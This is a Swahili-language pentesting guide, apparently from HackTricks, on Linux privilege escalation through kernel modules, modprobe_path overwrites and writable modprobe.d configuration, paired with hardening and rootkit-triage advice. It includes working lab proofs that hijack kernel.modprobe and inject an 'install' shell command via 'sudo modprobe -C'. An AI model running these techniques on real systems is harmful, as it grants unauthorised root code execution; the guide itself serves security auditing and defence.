# Kernel Modules and modprobe Abuse

{{#include ../../banners/hacktricks-training.md}}

## Makosa ya usanidi wa kernel module na upakiaji wa module

Usaidizi wa kernel module ni eneo lenye athari kubwa wakati wa kukagua privilege escalation kwenye Linux. Usichukulie kila ujumbe kuhusu module isiyo na saini kuwa unaweza kutumiwa vibaya peke yake, lakini uutumie kujibu maswali ya vitendo.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Je, mtumiaji wa sasa anaweza kupakia module kupitia `sudo`, capabilities, au njia ya helper inayoweza kuandikwa?
- Je, upakiaji wa module bado umewashwa?
- Je, utekelezaji wa saini za module umezimwa?
- Je, saraka za module, faili za module, au njia za usanidi za `modprobe.d` zinaweza kuandikwa?<sup>[[16]](#references)</sup>
- Je, logi za kernel zinaweza kusomwa ili kuthibitisha kilichotokea?

Ukaguzi wa haraka huanza na ukaguzi ufuatao wa hali ya module, saini, logi na mti wa module.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Tafsiri:

- `modules_disabled=1` inamaanisha moduli haziwezi kupakiwa wala kupakuliwa, na thamani hiyo haiwezi kuwekwa upya kuwa `0` hadi mfumo uwashwe upya.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` kwenye mstari wa amri wa kernel au `CONFIG_MODULE_SIG_FORCE=y` huhitaji moduli ziwe zimesainiwa ipasavyo; vinginevyo, moduli zisizosainiwa zinaweza kupakiwa na kuweka alama ya taint kwenye kernel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` haiweki kizuizi chochote kwenye `dmesg`; ikiwa thamani yake ni `1`, ufikiaji unahitaji `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Njia zinazoweza kuandikwa ndani ya `/lib/modules/$(uname -r)/` ni hatari kwa sababu `modprobe` hutafuta kwenye mti huo na data yake ya utegemezi inapopakia moduli.<sup>[[8]](#references)</sup>

### Kupakia moduli na kusoma matokeo ya kernel

Ikiwa una ruhusa halali ya kupakia moduli ya ndani, `insmod` huingiza faili halisi ya `.ko` unayotoa. Kazi ya init ya moduli huendeshwa wakati wa upakiaji, na ujumbe unaoandikwa kwa `printk()` huenda kwenye bafa ya kumbukumbu ya kernel, ambayo kwa kawaida husomwa kwa kutumia `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Mtiririko wa chini kabisa wa ukaguzi hutumia `modinfo` kukagua metadata, `insmod` na `rmmod` kupakia na kuondoa moduli, `lsmod` kuthibitisha hali ya upakiaji, na `dmesg` kukagua kumbukumbu za kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Ikiwa `sudo -l` inaruhusu `insmod`, `modprobe`, au wrapper inayozizunguka, lichukulie hilo kama hatari kubwa: `sudo -l` huorodhesha ruhusa za mtumiaji aliyeendesha amri, na kupakia kernel module kunahitaji `CAP_SYS_MODULE`. Tazama [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) kwa njia za moja kwa moja zinazotegemea capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` inayoruhusiwa kupitia sudo

Sheria ya sudo inayomruhusu mtumiaji kutekeleza `insmod` si sawa na kumruhusu kutumia zana ya kawaida ya usimamizi. Msimbo wa uanzishaji wa module hutekelezwa wakati wa kuiingiza, kwa hivyo swali muhimu katika ukaguzi ni kama mtumiaji huyu anaweza kuchagua au kurekebisha module inayopakiwa.<sup>[[3]](#references)</sup>

Mtiririko ufuatao wa ukaguzi unarudia ukaguzi wa module inayoweza kutumika: kuchunguza, kupakia, kukagua hali na kumbukumbu, kisha kuiondoa.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Ikiwa mtumiaji anaweza kutoa `.ko` yoyote, katika tathmini iliyoidhinishwa hili linapaswa kuchukuliwa kuwa limeathiri usalama wa mfumo mzima. Mbinu salama zaidi ya kiutendaji ni kuepuka kukabidhi upakiaji wa module kupitia sudo; ikiwa haiwezi kuepukika, weka vikwazo kwa njia kamili, umiliki, ruhusa, sera ya kusaini, na utaratibu wa kuondoa.<sup>[[3]](#references)[[10]](#references)</sup>

Kwa mfano usio na madhara wa kujenga module katika lab inayodhibitiwa, chanzo kidogo na Makefile vinaonyeshwa hapa chini; umbo la `make -C /lib/modules/$(uname -r)/build M=$PWD` linafuata mtiririko wa kbuild ulioandikwa kwenye nyaraka za kernel kwa modules za nje.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Jenga na pakia katika maabara iliyoidhinishwa pekee; kbuild hujenga moduli ya nje na amri za kupakia/kuondoa hutumia violesura vya moduli za kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Ukaguzi wa matumizi mabaya ya `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` hutaja helper ya userspace ambayo kernel huendesha kwa maombi ya kupakia module kiotomatiki; sysctl hii huathiri upakiaji huo wa kiotomatiki, si uwekaji wa module wa moja kwa moja. Ikiwa mshambuliaji anaweza kuibadilisha iwe njia ya executable inayoweza kuandikwa na kuchochea ombi la module, helper hiyo huwa njia ya kutekeleza msimbo yenye haki za juu. Kuiweka kuwa mfuatano tupu huzima maombi ya upakiaji wa kiotomatiki; ikiwa `CONFIG_STATIC_USERMODEHELPER=y`, thamani isiyo tupu hubadilishwa na njia ya helper tuli iliyokusanywa ndani.<sup>[[1]](#references)</sup>

Angalia njia ya sasa ya helper kupitia kiolesura cha kernel sysctl na ukague umiliki na mode ya lengwa.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Angalia kama sysctl, sheria za sudo zilizokabidhiwa, au file capabilities zinaweza kuathiriwa.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Muundo huu unaotumika kwenye maabara pekee hubadilisha njia ya helper na kuanzisha ombi la module-autoload lililoandikwa kwenye nyaraka; utumie tu kwenye mfumo uliotengwa na ulioidhinishwa.<sup>[[1]](#references)</sup>

Kwenye kernel za Linux za sasa, usitumie executable isiyojulikana kama kichocheo cha jumla: uoloadishaji wa moduli wa zamani kupitia custom binary-format uliondolewa katika Linux 6.14, huku nyaraka za kernel zikibainisha aina ya filesystem isiyojulikana kama njia ya ombi la module-autoload.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Kwenye mifumo iliyoimarishwa, hili linapaswa kushindwa ikiwa ruhusa zinazuia watumiaji wasio na mapendeleo kuandika kwenye `kernel.modprobe`, njia ya helper haiwezi kuandikiwa, au upakiaji otomatiki wa modules umezimwa.<sup>[[1]](#references)</sup>

### Usanidi wa `modprobe.d` unaoweza kuandikiwa na `sudo modprobe -C`

Kabla ya kutafuta module, `modprobe` husoma faili za `.conf` kutoka kwenye saraka za usanidi kama vile `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, na `/lib/modprobe.d`, kwa mpangilio wa kipaumbele. Faili yenye jina lilelile katika saraka yenye kipaumbele cha juu hufunika faili iliyo katika saraka yenye kipaumbele cha chini. Muhimu zaidi, agizo la `install <module> <command>` hutekeleza amri yoyote ya shell **badala ya** kuingiza module hiyo. Kwa hiyo, njia ya usanidi inayoweza kuandikiwa inaweza kusababisha utekelezaji wa amri uliocheleweshwa kwa kutumia ruhusa za mtumiaji atakayetekeleza `modprobe` baadaye akiwa na mapendeleo; utekelezaji wa saini za kernel hauhakiki amri hii ya userspace.<sup>[[16]](#references)</sup>

Kagua ruhusa za saraka na faili, kisha chunguza usanidi unaotumika. `modprobe -n -v` ni salama kwa ukaguzi wa utatuzi kwa sababu hali ya dry-run haiingizi module wala kutekeleza amri ya `install`/`remove`. Pendelea `modprobe -c` badala ya umbo la zamani la `--showconfig`, ambalo nyaraka za sasa za kmod zinasema litaondolewa baada ya kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Sheria ya sudo isiyo na vizuizi kwa `modprobe` inaweza kutumiwa vibaya hata kama faili holela za `.ko` haziwezi kupita uthibitishaji wa sahihi: `-C` huchagua saraka ya usanidi inayodhibitiwa na mshambuliaji, ambamo amri ya `install` inaweza kutekelezwa na mchakato ulioanzishwa na sudo.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Kwa ajili ya kupunguza hatari, usiruhusu matumizi ya `modprobe` bila vizuizi vya hoja kupitia sudo, hakikisha kila saraka ya usanidi inamilikiwa na root na haiwezi kuandikwa, na kagua maagizo ya `install`/`remove` yasiyotarajiwa. Ikiwa utaratibu wa kiutawala unaoaminika unahitaji kupuuza maagizo hayo kwa moduli moja, `modprobe --ignore-install` huyapuuza kwa moduli hiyo iliyotajwa, lakini vitegemezi bado vinaweza kuwa na amri zake.<sup>[[8]](#references)[[16]](#references)</sup>

### Ukaguzi wa `/lib/modules` zinazoweza kuandikwa

Saraka za moduli zinazoweza kuandikwa zinaweza kuruhusu kubadilishwa kwa moduli, kupandikizwa kwa moduli hasidi, au matumizi mabaya ya upakiaji otomatiki, kutegemea jinsi `modprobe` itakavyoendeshwa baadaye; `modprobe` hutafuta `/lib/modules/$(uname -r)` na kutumia data yake ya vitegemezi inapotafuta moduli.<sup>[[8]](#references)</sup>

Kagua faili za moduli zinazoweza kuandikwa na metadata ya vitegemezi/alias katika mti wa moduli wa toleo la kernel linalotumika.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Ukipata maudhui ya module yanayoweza kuandikwa, kagua jinsi `modprobe` inavyotatua dependencies na jinsi `modinfo` inavyoripoti metadata ya module.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Vidokezo vya kujilinda:

- Hakikisha `/lib/modules` inamilikiwa na `root:root` na haiwezi kuandikiwa na watumiaji.<sup>[[8]](#references)</sup>
- Weka `kernel.modules_disabled=1` baada ya kuwasha mfumo pale inapowezekana kiutendaji.<sup>[[1]](#references)</sup>
- Tekeleza uthibitishaji wa saini za module kwenye mifumo inayohitaji module zinazoweza kupakiwa.<sup>[[2]](#references)</sup>
- Fuatilia uandikaji kwenye `/proc/sys/kernel/modprobe`, `/lib/modules`, na saraka za usanidi za `modprobe.d`, pamoja na utekelezaji usiotarajiwa wa `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Uchunguzi wa awali wa rootkit inayotegemea module

Module hasidi inaweza kuingilia syscalls, mwonekano wa VFS au `/proc`, njia za mtandao, au ukaguzi wa vitambulisho ili kuficha michakato na faili, kuelekeza upya trafiki, au kunasa siri. Inaweza pia kujiondoa kwenye orodha ya module inayoonyeshwa na `lsmod`. Uendelevu unaweza kutokana na aliases au sheria za install za `modprobe.d`, `/etc/modules-load.d`, kitengo cha systemd, maudhui ya initramfs, au kubadilisha faili halali ya `.ko`. Matokeo ya kawaida ya `lsmod` ni ushahidi muhimu, lakini udukuzi wa kiwango cha kernel unaweza kufanya orodha zinazotolewa na kernel zisiwe za kutegemewa. Linganisha module zilizopakiwa, faili zilizo kwenye diski, usanidi wa kuwasha mfumo, kumbukumbu za upakiaji wa module, na telemetry ya nje inayoaminika.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Kagua majina ya module, paths, dependencies, signatures na nyakati za kupakia zisizotarajiwa. Ujumbe kuhusu kernel taint na module zisizosainiwa ni dalili za kuchunguza, si uthibitisho wa rootkit. Ikiwa kuna shaka ya rootkit, kusanya ushahidi kutoka kwenye image inayoaminika au mazingira ya recovery kabla ya kutegemea matokeo ya kernel inayoendesha. Ukurasa wa [tathmini ya udhaifu wa kernel](kernel-vulnerability-assessment.md) unaeleza usanidi na uwezekano wa kufichua taarifa kupitia uchunguzi, ukiwemo tracefs na BPF objects zilizobandikwa.

## References

- [1] [Nyaraka za /proc/sys/kernel/ — Nyaraka za Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kituo cha kusaini kernel module — Nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Misingi ya Driver — Nyaraka za Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Kuweka kumbukumbu za ujumbe kwa printk — Nyaraka za Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Kujenga External Modules — Nyaraka za Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Unganisha tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
